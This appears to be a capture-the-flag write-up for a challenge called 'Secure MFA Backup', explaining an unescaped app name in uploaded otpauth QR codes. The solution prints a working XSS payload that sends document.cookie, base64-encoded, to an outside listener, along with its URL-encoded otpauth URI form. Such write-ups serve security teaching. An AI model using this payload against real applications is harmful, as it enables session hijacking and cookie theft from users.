# Secure MFA Backup

Have you seen the news? Google Authenticator will finally support backups of our MFA codes.
My app did this years ago, check it out! 
I built it with a security in mind so I have a certified auditor check it every once in a while.

> Be aware, that the auditor will delete any dangerous code when they see it

## Solution

The app is generally safe. On functionality that can be used is an upload. When you upload QR code with a proper OTP format, the name of the App won't be escaped.

Example payload:

```
<script>document.location="http://127.0.0.1:1337/" + btoa(document.cookie)</script>
```

For location you should use your own webserver that will get the request (ngrok, interact.sh, collaborator etc.)

Then you should include URL-encoded payload in the a valid otpauth URI:

```
otpauth://totp/App:%3Cscript%3Edocument.location%3D%22http%3A%2F%2F127.0.0.1%3A1337%2F%22%20%2B%20btoa%28document.cookie%29%3C%2Fscript%3E?secret=JBSWY3DPEHPK3PXP&issuer=App
```

All you have to do is make a QR code from this, upload it and wait for the request with cookie which holds the flag.
